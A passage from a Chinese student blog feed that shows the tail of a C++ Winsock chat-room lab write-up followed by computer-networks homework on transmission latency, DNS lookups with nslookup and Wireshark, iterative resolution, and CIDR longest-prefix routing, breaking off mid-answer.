class="hljs-type">char</span> msg_exit[MSG_SIZE];                <span class="hljs-built_in">memset</span>(msg_exit, <span class="hljs-number">0</span>, MSG_SIZE);                msg_exit[<span class="hljs-number">0</span>] = EXIT_C;                string exit_msg =<span class="hljs-string">"you have been moved out of the chat room"</span>;                <span class="hljs-built_in">send</span>(*socket, msg_exit, MSG_SIZE, <span class="hljs-number">0</span>);                <span class="hljs-built_in">closesocket</span>(*socket);                sock_connects[id] = <span class="hljs-number">0</span>;                username_map.<span class="hljs-built_in">erase</span>(username);                string gone_saying = username + <span class="hljs-string">" has quit the chat room at "</span>;                <span class="hljs-built_in">print_message</span>(GONE, gone_saying,<span class="hljs-built_in">get_time_str</span>());                <span class="hljs-comment">//broadcast the quit message</span>                <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> sock_connect: sock_connects) {                    <span class="hljs-keyword">if</span> (sock_connect != <span class="hljs-number">0</span>) {                        <span class="hljs-comment">// attach the content to the message</span>                        <span class="hljs-type">char</span> msg_forwards[MSG_SIZE];                        <span class="hljs-built_in">memset</span>(msg_forwards, <span class="hljs-number">0</span>, MSG_SIZE);                        msg_forwards[<span class="hljs-number">0</span>] = QUIT_C;                        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TXT_SIZE; i++) {                            msg_forwards[TXT_PTR + i] = gone_saying[i];                        }                    }                }                <span class="hljs-keyword">break</span>;            }            <span class="hljs-keyword">case</span> PUB_C: {                <span class="hljs-comment">//get the username from the map</span>                string info=<span class="hljs-string">"received a public message from "</span>;                info+=username;                <span class="hljs-built_in">print_toggle</span>(LOG, info,<span class="hljs-built_in">get_time_str</span>());                <span class="hljs-built_in">broadcast</span>(msg, id);                <span class="hljs-keyword">break</span>;            }            <span class="hljs-keyword">case</span> PRI_C: {                <span class="hljs-comment">//get the username from the map</span>                string info=<span class="hljs-string">"received a public message from "</span>;                info+=username;                <span class="hljs-built_in">print_toggle</span>(LOG, info,<span class="hljs-built_in">get_time_str</span>());                <span class="hljs-comment">//get the target user</span>                <span class="hljs-type">char</span> target_user[NAME_SIZE];                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NAME_SIZE; i++) {                    target_user[i] = msg[NAME_PTR + i];                }                <span class="hljs-function">string <span class="hljs-title">target_user_s</span><span class="hljs-params">(target_user)</span></span>;                <span class="hljs-comment">//check if the target user is online</span>                <span class="hljs-keyword">if</span> (username_map.<span class="hljs-built_in">find</span>(target_user) == username_map.<span class="hljs-built_in">end</span>()) {                    <span class="hljs-comment">//target user is not online</span>                    <span class="hljs-comment">// show log on the server</span>                    string error_msg = <span class="hljs-string">"the target user "</span>;                    error_msg.<span class="hljs-built_in">append</span>(target_user);                    error_msg.<span class="hljs-built_in">append</span>(<span class="hljs-string">" provided by "</span>);                    error_msg.<span class="hljs-built_in">append</span>(username);                    error_msg.<span class="hljs-built_in">append</span>(<span class="hljs-string">" is not online!"</span>);                    <span class="hljs-built_in">print_message</span>(LOG, error_msg);                    <span class="hljs-comment">//send the error message to the sender</span>                    <span class="hljs-type">char</span> msg_error[MSG_SIZE];                    <span class="hljs-built_in">memset</span>(msg_error, <span class="hljs-number">0</span>, MSG_SIZE);                    msg_error[<span class="hljs-number">0</span>] = ERR_C;                    string ree_msg_to_send = target_user_s + <span class="hljs-string">" is not online!"</span>;                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TXT_SIZE; i++) {                        msg_error[TXT_PTR + i] = error_msg[i];                    }                    <span class="hljs-built_in">send</span>(*socket, msg_error, MSG_SIZE, <span class="hljs-number">0</span>);                } <span class="hljs-keyword">else</span> {                    string info_pri=<span class="hljs-string">"received a private message from "</span>;                    info_pri+=username;                    <span class="hljs-built_in">print_toggle</span>(LOG, info_pri,<span class="hljs-built_in">get_time_str</span>());                    <span class="hljs-comment">//target user is online</span>                    <span class="hljs-comment">//send the message to the target user</span>                    <span class="hljs-type">int</span> target_id = username_map[target_user];                    <span class="hljs-comment">// replace the target user's name with the sender's name</span>                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NAME_SIZE; i++) {                        msg[NAME_PTR + i] = username[i];                    }                    <span class="hljs-built_in">send</span>(sock_connects[target_id], msg, MSG_SIZE, <span class="hljs-number">0</span>);                }                <span class="hljs-keyword">break</span>;            }        }    }}</code></pre></div></div><h3 id="客户端进程">客户端进程</h3><h4 id="主线程-1">主线程</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ybszd0lmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-ybszd0lmrh9u6a"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">connect</span>(sockClient, (SOCKADDR *) &amp;addrSrv, <span class="hljs-built_in">sizeof</span>(SOCKADDR)) != <span class="hljs-number">0</span>) {    <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"connect failed"</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;}<span class="hljs-built_in">print_toggle</span>(SUC, <span class="hljs-string">"connect success"</span>, <span class="hljs-built_in">get_time_str</span>());<span class="hljs-comment">// send username</span><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {    <span class="hljs-built_in">print_toggle</span>(SERVER, <span class="hljs-string">"please input your username:"</span>, <span class="hljs-built_in">get_time_str</span>());    cin &gt;&gt; user_name;    <span class="hljs-comment">// check if the name is "all" or "quit" that may cause conflict</span>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(user_name, <span class="hljs-string">"all"</span>) == <span class="hljs-number">0</span> || <span class="hljs-built_in">strcmp</span>(user_name, <span class="hljs-string">"quit"</span>) == <span class="hljs-number">0</span>) {        <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"the username cannot be set to system reserved words"</span>);        <span class="hljs-keyword">continue</span>;    }    <span class="hljs-built_in">send</span>(sockClient, user_name, NAME_SIZE, <span class="hljs-number">0</span>);    <span class="hljs-comment">//it must be a buffer, although it is only a char</span>    <span class="hljs-type">char</span> status[<span class="hljs-number">1</span>];    <span class="hljs-built_in">recv</span>(sockClient, status, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span> (status[<span class="hljs-number">0</span>] == HELLO_C) {        <span class="hljs-built_in">print_toggle</span>(SUC, <span class="hljs-string">"welcome to the chat room!"</span>);        <span class="hljs-keyword">break</span>;    }    <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"the username has been used, please input another one"</span>);}HANDLE h_thread[<span class="hljs-number">2</span>];<span class="hljs-comment">// separate the sending and receiving thread to avoid blocking</span>h_thread[<span class="hljs-number">0</span>] = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, handlerRec, (LPVOID) &amp;sockClient, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);h_thread[<span class="hljs-number">1</span>] = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, handlerSend, (LPVOID) &amp;sockClient, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<span class="hljs-built_in">WaitForMultipleObjects</span>(<span class="hljs-number">2</span>, h_thread, TRUE, INFINITE);<span class="hljs-built_in">CloseHandle</span>(h_thread[<span class="hljs-number">0</span>]);<span class="hljs-built_in">CloseHandle</span>(h_thread[<span class="hljs-number">1</span>]);<span class="hljs-built_in">closesocket</span>(sockClient);<span class="hljs-built_in">WSACleanup</span>();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</code></pre></div></div><p>这一部分进行了用户信息发送以及创建了两个子线程用于发送和收取来自服务器的消息。之后阻塞等待线程结束。</p><h4 id="发送线程">发送线程</h4><p>首先将报文字段进行初始化，以便根据实际情况填入。循环等待用户输入，并在过程中两次检查是否需要退出。之后根据报文的控制段<code>TYPE</code>分别构建不同格式信息。注意在这一阶段并不是程报文中的每一个字段都一定用的到。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6fxci6lmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-6fxci6lmrh9u6a"><pre><code class="hljs c++"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">handlerSend</span><span class="hljs-params">(LPVOID lparam)</span> </span>{    <span class="hljs-keyword">auto</span> *socket = (SOCKET *) lparam;    <span class="hljs-type">char</span> to_user[NAME_SIZE];    <span class="hljs-type">char</span> msg[MSG_SIZE];    <span class="hljs-type">char</span> saying[TXT_SIZE];    <span class="hljs-built_in">memset</span>(to_user, <span class="hljs-number">0</span>, NAME_SIZE);    <span class="hljs-built_in">memset</span>(msg, <span class="hljs-number">0</span>, MSG_SIZE);    <span class="hljs-built_in">memset</span>(saying, <span class="hljs-number">0</span>, TXT_SIZE);    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {        <span class="hljs-built_in">print_toggle</span>(TIP, <span class="hljs-string">"please input \"user message\", input 'all' to send to all users"</span>);        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, to_user);        <span class="hljs-comment">// if nothing is input, then continue to ask for input again</span>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(to_user) == <span class="hljs-number">0</span>) {            cout&lt;&lt;<span class="hljs-string">"please input something"</span>&lt;&lt;endl;            <span class="hljs-keyword">continue</span>;        }        <span class="hljs-comment">//check quit</span>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(to_user, <span class="hljs-string">"quit"</span>) == <span class="hljs-number">0</span>) {            <span class="hljs-built_in">print_toggle</span>(TIP, <span class="hljs-string">"you chose to quit the chat room"</span>);            <span class="hljs-comment">//send quit message to server</span>            msg[<span class="hljs-number">0</span>] = QUIT_C;            <span class="hljs-built_in">send</span>(*socket, msg, MSG_SIZE, <span class="hljs-number">0</span>);            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        }        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%[^\n]"</span>, saying);        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(saying) == <span class="hljs-number">0</span>){            <span class="hljs-keyword">continue</span>;        }        <span class="hljs-comment">//check quit</span>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(saying, <span class="hljs-string">"quit"</span>) == <span class="hljs-number">0</span>) {            <span class="hljs-built_in">print_toggle</span>(TIP, <span class="hljs-string">"you have quit the chat room"</span>);            <span class="hljs-comment">//send quit message to server</span>            msg[<span class="hljs-number">0</span>] = QUIT_C;            <span class="hljs-built_in">send</span>(*socket, msg, MSG_SIZE, <span class="hljs-number">0</span>);            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        }        <span class="hljs-comment">//send message to server for forwarding</span>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(to_user, <span class="hljs-string">"all"</span>) == <span class="hljs-number">0</span>){            msg[<span class="hljs-number">0</span>] = PUB_C;            <span class="hljs-comment">//construct the message</span>            <span class="hljs-comment">//content</span>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TXT_SIZE; i++){                msg[i + TXT_PTR] = saying[i];            }            <span class="hljs-comment">// from user</span>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NAME_SIZE; i++){                msg[i + NAME_PTR] = user_name[i];            }            <span class="hljs-comment">//time stamp</span>            string time_stamp = <span class="hljs-built_in">get_time_str</span>();            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TIME_SIZE; i++){                msg[i + TIME_PTR] = time_stamp[i];            }            <span class="hljs-built_in">send</span>(*socket, msg, MSG_SIZE, <span class="hljs-number">0</span>);        }<span class="hljs-keyword">else</span>{            msg[<span class="hljs-number">0</span>] = PRI_C;            <span class="hljs-comment">//construct the message</span>            <span class="hljs-comment">//content</span>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TXT_SIZE; i++){                msg[i + TXT_PTR] = saying[i];            }            <span class="hljs-comment">// to user</span>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NAME_SIZE; i++){                msg[i + NAME_PTR] = to_user[i];            }            <span class="hljs-comment">//time stamp</span>            string time_stamp = <span class="hljs-built_in">get_time_str</span>();            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TIME_SIZE; i++){                msg[i + TIME_PTR] = time_stamp[i];            }            <span class="hljs-built_in">send</span>(*socket, msg, MSG_SIZE, <span class="hljs-number">0</span>);        }    }}</code></pre></div></div><h4 id="接收线程">接收线程</h4><p>接收线程是一个解析的过程，并往控制台进行不同格式输出。模式基本类似。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1kiqkylmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-1kiqkylmrh9u6a"><pre><code class="hljs c++"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">handlerRec</span><span class="hljs-params">(LPVOID lparam)</span> </span>{    <span class="hljs-keyword">auto</span> *socket = (SOCKET *) lparam;    <span class="hljs-type">char</span> msg[MSG_SIZE];    <span class="hljs-built_in">memset</span>(msg, <span class="hljs-number">0</span>, MSG_SIZE);    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {        <span class="hljs-built_in">recv</span>(*socket, msg, MSG_SIZE, <span class="hljs-number">0</span>);        <span class="hljs-type">char</span> type = msg[<span class="hljs-number">0</span>];        <span class="hljs-type">char</span> content[TXT_SIZE];        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TXT_SIZE; i++)            content[i] = msg[i + TXT_PTR];        <span class="hljs-type">char</span> time[TIME_SIZE];        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TIME_SIZE; i++)            time[i] = msg[i + TIME_PTR];        <span class="hljs-keyword">switch</span> (type) {            <span class="hljs-comment">// new server message</span>            <span class="hljs-keyword">case</span> NEW_C:                <span class="hljs-built_in">print_message</span>(NEW, content);                <span class="hljs-keyword">break</span>;            <span class="hljs-comment">// typed "quit" and all resources are released, exit the program</span>            <span class="hljs-keyword">case</span> EXIT_C:                <span class="hljs-comment">// end of the program</span>                <span class="hljs-built_in">print_toggle</span>(WARN, content);                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);            <span class="hljs-comment">// public normal message</span>            <span class="hljs-keyword">case</span> PUB_C:                <span class="hljs-comment">// get the sender's name</span>                <span class="hljs-type">char</span> fromUser[NAME_SIZE];                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NAME_SIZE; i++)                    fromUser[i] = msg[i + NAME_PTR];                <span class="hljs-comment">// print the message</span>                <span class="hljs-built_in">print_message</span>(PUB, content, time, fromUser);                <span class="hljs-keyword">break</span>;            <span class="hljs-comment">// handle message from server</span>            <span class="hljs-keyword">case</span> SERVER_C:                <span class="hljs-comment">//get the time from the message</span>                <span class="hljs-type">char</span> time_ser[TIME_SIZE];                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TIME_SIZE; i++)                    time_ser[i] = msg[i + TIME_PTR];                <span class="hljs-built_in">print_message</span>(SERVER, content, time_ser);                <span class="hljs-keyword">break</span>;            <span class="hljs-comment">// private message</span>            <span class="hljs-keyword">case</span> PRI_C:                <span class="hljs-comment">// get the sender's name</span>                <span class="hljs-type">char</span> from_user[NAME_SIZE];                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NAME_SIZE; i++)                    from_user[i] = msg[i + NAME_PTR];                <span class="hljs-comment">// print the message</span>                <span class="hljs-built_in">print_message</span>(PRI, content, time, from_user);                <span class="hljs-keyword">break</span>;        }    }}</code></pre></div></div><h2 id="思考">思考</h2><p>在Java程序设计课上，也编写过一个聊天程序。那时只是机械的学习API，虽然也大致了解TCP，UDP的概念，但对于协议的设计还是非常朴素的。虽然本次实验的协议设计也比较简单，但随着学习的深入也会对此有更新的认识。比如很明显的一个设计缺陷是把时间放到了数据段之后。如果把数据段放到最后，可以通过增加长度字段来支持变长数据的传输。其他的比如数据校验等方面也可以继续改进。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-书面作业1</title>
    <link href="/posts/54831/"/>
    <url>/posts/54831/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络-书面作业1">计算机网络-书面作业1</h1><p>2013599_田佳业</p><h3 id="第一章问题">第一章问题</h3><p>网络结构如下图所示，主机A与主机B之间通过两段链路和一台转发设备R进行连接，每条链路的长度和传输速率已经在图中标出，R采用存储转发机制。主机A向主机B发送一个长度为10000字节的报文，请回答以下问题（设电磁波传播速度为2*108米/秒）</p><ol type="1"><li><p>如果采用报文交换，请计算端到端的最小时延，即从主机A传输报文的第一位开始，到主机B接收到报文的最后一位为止所用的时间。</p></li><li><p>如果将报文分成5个报文分组传输，请计算完成报文传输的最小端到端时延（忽略报文分组的封装开销）。</p></li></ol><p>在统计多路复用机制中，端到端的时延具有不确定性，请简要分析影响端到端时延的主要因素。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211058424432_805_20221120095815944612_600_clip_image002.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><ol type="1"><li></li></ol><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211059236518_851_20221228103350003675_727_image-20221228093807403.png" alt="image-20221228093807403"><figcaption aria-hidden="true">image-20221228093807403</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211100678849_931_20221228103353392389_877_image-20221228095021089.png" alt="image-20221228095021089"> <span class="math display">\[\mathrm{Latency_1 = PROP + TRANSP}=\frac{(4+2)\times 10^3}{2 \times10^{8}}+\frac{10^{4} \times 8}{100\times 10^6}+\frac{10^{4} \times8}{10\times 10^6}\\=3\times 10^{-5}+8\times 10^{-4}+8\times 10^{-3}=8.83\times10^{-3}\text{s}\]</span> 可以看到传播速率主要取决于链路2的传输速度。</p><ol start="2" type="1"><li></li></ol><p><span class="math display">\[\mathrm{Latency_2} =\mathrm{Latency_1}-\frac{4}{5}\frac{10^{4} \times8}{100\times 10^6}=8.19\times 10^{-3}\text{s}\]</span> 为什么可以这么算?</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211102220231_387_20221228103355518362_356_image-20221228101441745.png" alt="image-20221228101441745"><figcaption aria-hidden="true">image-20221228101441745</figcaption></figure><p>同时也可以看出，在这个问题中，节省的时间仅取决于第一个链路的时延。因为第二条链路比较慢，所以总体上来说并没有节省太多时间。</p><p>（3）主要因素包括：</p><ul><li><p>核心：存储转发设备中的排队时延</p></li><li><p>路由器中的处理时间：路由决策、差错检验、分片等操作</p></li><li><p>报文分组大小和分组数量，数据流的个数，数据流占带宽的频率，都会影响时延。</p></li><li><p>链路的传输速率，链路长度</p></li></ul><p>排队时延是导致“不确定性“的最主要因素。</p><h3 id="第二章问题">第二章问题</h3><h6 id="section">1.</h6><p>通过使用Windows命令行模式提供的nslookup命令查询www.baidu.com的IP地址，给出结果截图，并对返回的结果进行解释。同时，利用Wireshark捕获查询的交互过程，给出结果截图，并进行简要说明。</p><ol type="1"><li></li></ol><p>nslookup命令用于<strong>查询DNS的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题</strong></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211105692753_410_20221120095816836309_574_image-20221115205303473.png" alt="image-20221115205303473"><figcaption aria-hidden="true">image-20221115205303473</figcaption></figure><p>服务器为本机DNS服务器信息，Address表示的是 DNS 服务器地址。</p><p>非权威应答表示，非从域名的权威服务器获得结果，而是从本地DNS缓存中获取的结果</p><p>www.a.shifen.com是百度域名曾经的一个别名，<code>shifen.com</code>和<code>baidu.com</code>两台域服务器其实是同一台服务器。</p><p>下面的Address便是百度域名对应的ip地址。以第一个为例，搜索一下看看:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211106734346_212_20221120095817744460_340_image-20221115210510064.png" alt="image-20221115210510064"><figcaption aria-hidden="true">image-20221115210510064</figcaption></figure><ol start="2" type="1"><li></li></ol><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211107709615_845_20221120095840824680_626_image-20221115211104602.png" alt="image-20221115211104602"><figcaption aria-hidden="true">image-20221115211104602</figcaption></figure><p>输入dns进行过滤，可以看到解析百度时的报文发送和应答，对应左边灰色的箭头。</p><p>可以看出 ，DNS 为应用层协议 ，下层传输层采用 UDP ，再下层网络层是IPV4 协议 。</p><p>下面结合DNS报文格式进行分析:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211108799252_424_20221120095842598552_479_image-20221115211202585.png" alt="image-20221115211202585"><figcaption aria-hidden="true">image-20221115211202585</figcaption></figure><p>本机(10.130.93.171是WLAN的IPv4地址)首先向服务器发出查询请求 ，然后服务器解析 IP 找到主机 ，做出响应 。接着 ，主机向服务器发送查询www.baidu.com信息的对应请求，服务器接受到请求后作出响应。并且可以看到回应的报文Answers区域报文包括的内容未必是等长，格式相同的。每一个回答反映一部分需要的信息。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211110204046_677_20221120095845117430_948_image-20221115211646689.png" alt="image-20221115211646689"><figcaption aria-hidden="true">image-20221115211646689</figcaption></figure><p>资源记录结构如下所示:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211111256885_875_20221120100009402791_134_image-20221115220024906.png" alt="image-20221115220024906"><figcaption aria-hidden="true">image-20221115220024906</figcaption></figure><p>比如图中的A对应将名称对应到IPv4的32位地址。</p><h6 id="section-1">2.</h6><p>以反复解析为例，说明域名解析的基本工作过程（可以结合图例）。给出内容分发网络（CDN）中DNS重定向的基本方法，说明原始资源记录应该如何修改，并描述重定向过程。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211112307874_994_20221120100010926561_580_image-20221115222340231.png" alt="image-20221115222340231" style="zoom: 67%;"></p><p>1.2.首先查本地缓存，如果没有记录，则以DNS客户的身份向根域名服务器发出解析请求(2)，如果有直接将IP地址返回请求主机(实验操作中的情况，对应图中的8)</p><p>3.根域名服务器收到请求后，判断该域名属于.com域，将对应的TLD(顶级域名服务器，此处为.com)的IP地址返回给本地域名服务器。4.本地域名服务器再次请求</p><p>5.TLD收到请求后，判断该域名属于baidu.com域，因此将对应的授权域名服务器baidu.com的IP地址返回给本地域名服务器。</p><p>6.向百度的顶级域名服务器baidu.com.请求www.baidu.com。</p><p>7.返回ip地址</p><p>8.本地域名服务器把结果返回客户机并缓存</p><p>当然对于百度这个例子，它发现这个www有别名叫www.a.shifen.com。</p><p>拿到www.baidu.com的别名www.a.shifen.com的时候，本来要重新到com域查找shifen.com的NS，又因为，两个域在同一台NS上，所以直接向本机(授权域名服务器)发起了shifen.com域的查找请求，把a.shifen.com的IP返回。</p><h6 id="section-2">3.</h6><p>在DNS域名系统中，域名解析时使用UDP协议提供的传输层服务（DNS服务器使用UDP的53端口），而UDP提供的是不可靠的传输层服务，请你解释DNS协议应如何保证可靠机制。</p><p>首先，查阅了解了为什么DNS使用UDP:其实感性上就可以理解，DNS并不需要TCP所提供的全部可靠性机制，而TCP会相比UDP耗费更多的资源。当然，其实DNS在设计之初就在区域传输中引入了 TCP 协议的可选项。</p><p>关于如何保证可靠性，主要有以下几个方面:</p><p>从DNS应用层本身来说，首先报文中问题的数量、回答的数量，就可以可以用来进行一定的校验，同时DNS也是有生存周期的，在生命周期过后会进行重新请求更新以保证数据的正确性。</p><p>从可用性上来说，DNS的权威服务器也是冗余支持的。</p><p>从安全性上来说，DNS脆弱性主要有两个可能的方面:一是课本中提到的DDoS攻击，当然由于缓存机制的存在很难造成实质性的危害;另外更常见的是针对缓存进行欺骗的所谓投毒攻击，现在也有DNS安全扩展 (<a href="https://cloud.google.com/dns/docs/dnssec?hl=zh-cn">DNSSEC</a>)对其进行保护。</p><p>当然以上几个方面和TCP从协议层面上保证的可靠性肯定不能等同而论，但足以满足实际应用是需求。</p><blockquote><p>答案就写了超时重传和差错检测，大概其实是想问如果要实现可靠机制需要增加哪些机制吧。</p></blockquote><h6 id="捎带复习一下域名格式压缩">捎带复习一下域名格式压缩</h6><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211113362069_658_20221120100012567584_212_image-20221115230206425.png" alt="image-20221115230206425"><figcaption aria-hidden="true">image-20221115230206425</figcaption></figure><p>"11"指字节的前两位</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211114836606_350_20221120100014215164_756_image-20221115230406295.png" alt="image-20221115230406295"><figcaption aria-hidden="true">image-20221115230406295</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-书面作业2</title>
    <link href="/posts/55151/"/>
    <url>/posts/55151/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络-书面作业2">计算机网络-书面作业2</h1><p>下表是一个使用CIDR（无类域间路由）的路由表，为了计算方便，IP地址使用十六进制表示。针对下面每个目的地址给出路由器所选择的下一步跳的标号，即A、B、C、D和E，并给出计算过程。</p><ol type="1"><li><p>C4.5E.13.87</p></li><li><p>C4.5E.22.09</p></li><li><p>C3.41.80.02</p></li><li><p>5E.43.91.12</p></li><li><p>C4.6D.31.2E</p></li><li><p>C4.6B.31.2E</p></li></ol><table><thead><tr class="header"><th>网络地址/前缀长度</th><th><strong>下一步跳</strong></th></tr></thead><tbody><tr class="odd"><td>C4.50.0.0/12</td><td>A</td></tr><tr class="even"><td>C4.5E.10.0/20</td><td>B</td></tr><tr class="odd"><td>C4.60.0.0/12</td><td>C</td></tr><tr class="even"><td>C4.68.0.0/14</td><td>D</td></tr><tr class="odd"><td>0.0.0.0</td><td>E</td></tr></tbody></table><p>首先方便最长匹配,将路由表重新排序:</p><table><thead><tr class="header"><th>网络地址/前缀长度</th><th><strong>下一步跳</strong></th></tr></thead><tbody><tr class="odd"><td>C4.5E.10.0/20</td><td>B</td></tr><tr class="even"><td>C4.68.0.0/14</td><td>D</td></tr><tr class="odd"><td>C4.60.0.0/12</td><td>C</td></tr><tr class="even"><td>C4.50.0.0/12</td><td>A</td></tr><tr class="odd"><td>0.0.0.0</td><td>E</td></tr></tbody></table><ol type="1"><li><p>C4.5E.13.87 前20位和第一条路由匹配，下一跳是B</p></li><li><p>C4.5E.22.09前20位和第一条路由不匹配，但与第四条路由前12位匹配，下一跳是A</p></li><li><p>C3.41.80.02 前四条路由都不匹配，选择默认路由 